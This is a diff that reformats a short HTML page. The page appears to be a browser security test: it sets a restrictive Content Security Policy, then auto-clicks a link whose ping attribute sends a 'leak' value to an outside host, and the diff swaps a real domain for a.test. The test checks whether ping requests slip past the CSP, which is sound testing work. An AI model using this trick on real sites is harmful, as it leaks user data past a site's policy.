@@ -1,10 +1,17 @@
 <!DOCTYPE html>
 <head>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline';">
-    <script>
-        window.onload = function () { document.getElementById("a").click(); };
-    </script>
+  <meta
+    http-equiv="Content-Security-Policy"
+    content="default-src 'none'; script-src 'unsafe-inline';"
+  />
+  <script>
+    window.onload = function () {
+      document.getElementById("a").click();
+    };
+  </script>
 </head>
 <body>
-<a id="a" href="#done" ping="https://adition.com/report/?leak=c560695">click here to exploit</a>
+  <a id="a" href="#done" ping="https://a.test/report/?leak=c560695"
+    >click here to exploit</a
+  >
 </body>
